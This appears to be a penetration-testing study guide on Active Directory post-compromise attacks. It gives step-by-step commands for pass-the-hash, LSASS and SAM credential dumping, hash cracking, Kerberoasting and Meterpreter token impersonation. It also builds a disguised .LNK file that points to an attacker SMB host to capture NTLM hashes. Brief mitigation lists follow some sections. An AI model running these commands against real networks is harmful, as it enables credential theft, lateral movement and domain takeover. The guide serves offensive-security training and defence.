---
description: >-
  Insight into further attacks that can be performed on AD after compromise +
  further enumeration once we obtain an account/access.
---

# 😃 Active Directory Post-Compromise Attacks

## Pass the Password & Pass the Hash:

* This is useful if we can crack a password and/or dump the SAM hashes for lateral movement in networks.&#x20;
* Pass the Password attempts to use a user's account and password across a network to try and log in to anywhere else successfully.&#x20;



Method:

1. For a Pass the Password attack, run crackmapexec like this:

{% code title="Attempting Pass the Password across a subnet using compromised user credentials. " %}
```bash
root@kali:~# crackmapexec smb [Network IP]/[CIDR Notation for Subnet] -u [Username] -d [Domain] -p [Password]
```
{% endcode %}

-> "smb": SMB is a Windows protocol for remote authentication, which is exactly what we're doing here with Pass the Password.&#x20;

-> This command sweeps the network subnet.

-> We are not cracking any hashes just yet. For this attack, we are simply using a known password.

> If you get "Pwn3d!" for a machine, it means you have admin-level rights with those account credentials on that machine.

> A green icon means authentication is successful, but without an accompanying "Pwn3d!" message, you have access but not admin-level/owner rights.

***

## Pass the Hash Attack:



Method:

1. For a Pass the Hash attack, run crackmapexec like this:

{% code title="Pass the Hash attack command using crackmapexec." %}
```shellscript
root@kali:~# crackmapexec smb [Network IP]/[CIDR Notation for Subnet] -u administrator -H [User's Password Hash Obtained Before] --local-auth --sam
```
{% endcode %}

-> "-H": signals the user of a hash. We need NTLMv1 here.&#x20;

-> "--local-auth": used to log in to those machines locally against their SAM database, not the domain. This will only work if there is a local administrator account with the same password hash on multiple machines. Without this, CME sends the creds to the DC for domain authentication (but the DC doesn't know about local accounts on a specific machine) meaning it will fail. That's why it's against the local SAM database where the creds can actually be found. &#x20;

-> "--sam": Dumps SAM hashes for other users upon authenticating.



2. For a summary of all successful logins, credentials and machines crackmapexec was used on, navigate first to the crackmapexec database like this:

{% code title="Entering the CLI for the crackmapexec database. " %}
```shellscript
root@kali:~# cmedb
```
{% endcode %}

3. Access the information on hosts in the database through this command in the CLI:

{% code title="Accessing the CME database." %}
```
cmedb (default)(smb) > hosts
```
{% endcode %}

-> This will contain the IP addresses used for crackmapexec



4. Access the information on credentials used with crackmapexec in the database through this command in the CLI:

{% code title="Access credentials information, including hashes, to see where credentials worked. " %}
```
cmedb (default)(smb) > creds
```
{% endcode %}



{% hint style="info" %}
Still not cracking any hashes at this point. We don't even know if the hash is crackable just yet. We just "pass it around" to the machines in the subnet to see if it's accepted.&#x20;
{% endhint %}

{% hint style="info" %}
This is why different Admin passwords are required for different machines - if the passwords were the same, their password hash could just be passed around like this.&#x20;
{% endhint %}

You can also modify this command for further functionality. Below is an example for exploiting the LSASS (Local Security Authority Subsystem Service).&#x20;



Modifying crackmapexec for further exploitation:

1. Add an "-M" switch to the end of the crackmapexec command + a module you want to use:

```shellscript
root@kali:~# crackmapexec smb [Network IP]/[CIDR] -u administrator -H [HASH] --local-auth -M lsassy

```

-> This command uses a known NTLM hash for the local Admin account to try authenticating, using these credentials, to many machines over the subnet using SMB. If the logic succeeds, the command will attempt to dump the credentials from the LSASS on those machines.&#x20;

-> "-M lsassy": loads the lsassy module. This means the credential material from LSASS on that machine will be attempted to be extracted if there is a successful login.&#x20;



***

## Dumping Hashes:

* We will dump hashes through secretsdump, which is extremely useful for lateral movement.



Method for Dumping Hashes:

1. Run this command using secretsdump:

{% code title="Run this command in the directory containing secretsdump.py. You must use credentials for an Administrator account here." %}
```bash
root@kali:~# secretsdump.py [Domain]/[Username]:'[Password]'@[Target Machine IP Address]
```
{% endcode %}

-> This command will dump hashes for user accounts we may not know even existed (including other Administrator accounts!), using just the compromised credentials of a single user.&#x20;

-> Once you obtain those hashes, you can attempt to crack them and logon using those creds and then attempt to pass the password/pass the hash etc. for network lateral movement.&#x20;

-> Respray the network with either the hash/password of those other Admin accounts.



{% hint style="info" %}
You require Admin credentials here because secretsdump.py extracts sensitive data by accessing areas of the machine that are sensitive, like the SAM database.&#x20;
{% endhint %}



2. Repeat for all machines for which you have admin credentials, using the previous pass the password/hash attacks - this is respraying.



3. You can also attempt login with just the hash of an account, not password, like this:

{% code title="Using Pass the Hash again with the Admin account hash." %}
```shellscript
root@kali:~# secretsdump.py [Administrator Username]:@[Target Machine IP] -hashes [Account Password Hash Obtained Before]
```
{% endcode %}

-> This will dump the same thing, but is an alternate way to do it if you haven't cracked the hash.

-> From here, respray the network.&#x20;

{% hint style="info" %}
As a reminder, this works because Windows accepts the hash as proof during NTLM authentication.&#x20;
{% endhint %}

{% hint style="info" %}
Another reminder. The attack chain we have done until this point is along the lines of:

1. LLMNR Poisoning
2. getting an admin hash
3. cracking the admin hash
4. spraying the password across the network (pass the password if you cracked it successfully/pass the hash)
5. finding more logins
6. using secretsdump.py on those logins to get more local admin hashes
7. respraying the network (pass the password/pass the hash) with those local accounts
{% endhint %}

***

## Cracking Hashes:

* NTLM hashes (in a SAM format) look something like this:&#x20;

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::



* The format of this hash is as follows: username:RID:LM Hash: NT Hash:::

Username: Administrator
\
RID: 500
\
LM Hash: aad3b435b51404eeaad3b435b51404ee (mostly irrelevant - not useful)
\
NT Hash: 5f4dcc3b5aa765d61d8327deb882cf99 (called NTLM/NT Hash - very useful. In NTLM, the hash is the credential. This is what you could crack if you wanted to).



* We are going to be cracking the NT Hash part.&#x20;



Method:

1. Create a new text file and store the NT Hash inside it like this:

{% code title="Go inside this text file and add the hash into it." %}
```shellscript
root@kali:~# nano hash.txt
```
{% endcode %}

2. Run the Hashcat GREP method to find the module used for this NTLM hash:

{% code title="Using this command, find the module number for "NTLM". This is what we will use. " %}
```shellscript
root@kali:~# hashcat --help | grep NTLM 
```
{% endcode %}

{% hint style="info" %}
As a reminder, before doing this, you can also use hash-identifier to detect the hash type and grep that.
{% endhint %}

3. Run Hashcat using the module:

```
root@kali:~# hashcat -m [Module No.] hash.txt [Path to Wordlist]
```

-> If we're lucky, it will reveal the cracked hash password. Look for output like this:

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
This works because for NTLM, the hash is the credential.
{% endhint %}



Mitigating Against Pass Attacks:

1. Limit Account Re-use (i.e., credentials, disable unnecessary accounts, limit admin privileges).
2. Strong passwords (not too useful against pass-the-hash but can help prevent password cracking).
3. Privilege Access Management (PAM) to allow/disallow accounts admin privileges as needed.



***

## Kerberoasting:

* Quick way to get domain admin/service account privileges in a network using a compromised valid domain login. You don't need a privileged user's credentials for this. 
* A quick summary of the steps:

1. Request a TGT (Ticket Granting Ticket) from the Domain Controller (our Key Distribution Centre - KDC) by providing an NTLM hash. Any user on the domain can request this, so use any compromised credentials.
2. Receive a TGT back that's encoded with a Kerberos TGT hash.
3. Request TGS tickets for SPN accounts, by presenting our TGT.
4. Receive a TGS back encoded with the server's account hash. This is the only step that is visible to the attacker on the console.&#x20;
5. Crack the TGS tickets.



Method:

1. Run GetUserSPNs.py using this command:

{% code title="Using any compromised account creds to request a TGT for the account specified." %}
```shellscript
root@kali:~# GetUserSPNs.py [Domain]/[Username]:[Password] -dc-ip [DC IP Address] -request
```
{% endcode %}

-> We use GetUserSPNs.py because this finds accounts that have Service Principal Names (SPNs) because they generally use Kerberos service tickets, which are needed to run services - this is normal user behaviour.

-> "-dc-ip": the Domain Controller's IP Address.

-> "-request": instead of just listing accounts with SPNs, this sends TGS requests for Kerberos tickets for those services, which will be encoded with the service account's NTLM hash that need to be cracked.

-> The TGT is given to you (you can't see this on the console - it's invisible) right after authentication succeeds before the hash is output.&#x20;

-> You need to crack the hash output (for the TGS).



2. Copy the hash and crack it (put it in a file) using Hashcat (module: 13100). Again, specify a wordlist. Your command should look something like this:

```shellscript
root@kali:~# hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

3. Get the password and now you have credentials to a service account, not just a compromised user account.



Mitigation:

1. Strong passwords: can help prevent cracking.
2. Least privilege possible assigned to accounts. E.g., service accounts should not be domain admin accounts. You can give it permissions to do what it needs to do without making it domain admin.

***

## Token Impersonation:

* Tokens are temporary keys that allow someone to access a system/network without having to provide credentials every time you access a file. it is created when a user logs into a system and represents their identity & permissions. Every process the user launches inherits a copy of that token.&#x20;
* This means, for example, if a Domain Admin logs in and runs multiple processes, each of their processes contains a DA token. If you steal one of those processes, you can steal/impersonate that token and pretend to be them.&#x20;
* Delegate Tokens: tokens created for logging into a machine or using remote desktop. If a user is logged in, they'll have delegation tokens.
* Impersonate Tokens: "non-interactive" tokens, like a domain logon script.&#x20;
* Token Impersonation is essentially an attacker pretending to be a user with valid tokens, impersonating them, to make Windows believe they are that user.&#x20;
* For this attack, you can use Meterpreter, which is a shell that runs on a compromised Windows machine, helping for post-exploitation.&#x20;



Method:

1. You can use Metasploit in Kali Linux. Search for and use the payload of "psexec". We use psexec because it's used for remote code execution over SMB, provided you have valid credentials.&#x20;
2. Run "options" and set the payload for "windows/x64/meterpreter/reverse\_tcp". Set all the details (e.g., machine IP, username, password of compromised account etc.).

{% hint style="info" %}
At this point, you have just got a Meterpreter session on the target machine. You are simply getting onto that machine by this point.&#x20;
{% endhint %}

3. Once you have the Meterpreter shell, you have the option to run "shell" and get access to the Windows CMD CLI as an admin user (assuming you used admin credentials for this attack). If you used local admin creds for that machine, you'd be a local admin. If you used domain admin creds for that machine, you'd be a domain admin. From here, you could create a new account added to the domain admin group (as another foothold) if you needed to.&#x20;
4. From the Meterpreter shell, type in "load incognito". Incognito is a Meterpreter extension that adds commands for listing available tokens, impersonating a token, creating tokens etc. You need to load it to be able to use commands for token impersonation.&#x20;
5. Type in "help" to get the list of Incognito commands.&#x20;
6. Type in "list\_tokens -u" to see the delegate tokens available. This will tell you the users that are logged in. If a DA logged in earlier, their token would be here.&#x20;
7. Impersonate a token by using the "impersonate\_token" command. E.g., if you had a MARVEL\Administrator user delegate token:

{% code title="We use "\\" because "\" is an escape character in Ruby (what Meterpreter is written in)." %}
```
impersonate_token MARVEL\\administrator
```
{% endcode %}

8. If this works, you'll get a shell. Once impersonated, you could dump creds from the DC, create new domain admin accounts, do anything the user you impersonate can do.

{% hint style="info" %}
Basically, what is happening here is that you have admin creds on one machine. On that machine, an escalated user, like a Domain Admin, might be logged in (their delegate token is there). You steal/impersonate their token and then use that to authenticate laterally to another machine to get admin privileges there. Then, you can use PsExec there to get a session.&#x20;
{% endhint %}



Mitigation:

1. Limit user/group token creation permission.
2. Restriction on who is allowed to be a local admin on workstations (i.e., prevent server admins from being local admins) - prevent domain admins/other high-priv accounts from logging into regular workstations. This prevents their token from appearing there, to prevent them from being stolen by an attacker who aims to attack low-level machines first then escalate via vertical movement.&#x20;

***

## .LNK (Link) File Attacks:

* This is placing a malicious file in a shared folder. We can capture hashes using this.&#x20;
* We can use PowerShell for this (we need it to be elevated from your attacker machine).&#x20;



Method (in escalated PS):

1. $objShell = New-Object -ComObject WScript.shell

-> This creates a new COM object to build a Windows shortcut.

2. $lnk = $objShell.CreateShortcut("C:\test.lnk")

-> This creates a new shortcut file - test.lnk.

3. $lnk.TargetPath = "\\\192.168.138.149\\@test.png"

-> This points the link to the attacker's target machine IP. The filename "test.png" doesn't matter. Windows will still try to access it.

4. $lnk.WindowStyle = 1
5. $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
6. $lnk.Description = "Test"
7. $lnk.HotKey = "Ctrl+Alt+T"
8. $lnk.Save()

-> Saves the shortcut file to the disk.

-> Steps 4-7 are cosmetic, to make the shortcut link look legitimate (social engineering feature).



OPTIONAL:

1. You can put the file onto the machine through this command in CME/NetExec:

```shellscript
root@kali:~# netexec/crackmapexec smb [Target IP] -d [Domain] -u [Username] -p [Password] -M slinky -o NAME=[Filename to Place] SERVER = [Attacker IP]
```

{% hint style="info" %}
This works because Windows tries to resolve the target path of a shortcut and this can only be done by contacting the remote SMB path. This means even if the user never clicks on it, as long as they go to the directory where it's stored, Windows will send authentication metadata, potentially NTLM hashes in an attempt to do an SMB connection attempt.&#x20;
{% endhint %}


***



## Post-Compromise Strategy:

* We start with a compromised account.



1. Search for quick wins (e.g., Kerberoasting, Secretsdump, Pass attacks).
2. Once quick wins are exhausted, enumerate and dig deeper (e.g., BloodHound, where does account have access.
3. Think outside the box.
4. Move laterally until you can move vertically and compromise the domain.&#x20;



